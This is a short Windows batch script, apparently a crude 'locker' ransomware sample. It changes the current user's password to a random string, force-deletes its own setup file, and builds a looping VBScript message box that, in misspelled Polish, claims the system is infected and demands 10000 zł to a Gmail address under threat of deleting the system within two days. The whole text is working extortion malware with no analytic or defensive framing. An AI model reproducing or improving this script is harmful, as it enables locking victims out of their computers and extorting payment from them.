...
net user %username% *
8848fld2iij.fki39zvaj
8848fld2iij.fki39zvaj
DEL /F /S /Q /A "setup.exe"
start cmd.exe
echo do>>msg.vbs
echo Msgbox"Twuj system zostal zainfekowany wirusem zapalac 10000zl pod adres gmail WormLocker37737@gmail.com jak nie to za 2 dni twuj system zostanie usunienty",48+4,"Worm locker:)">>msg.vbs
echo loop>>msg.vbs
start msg.vbs
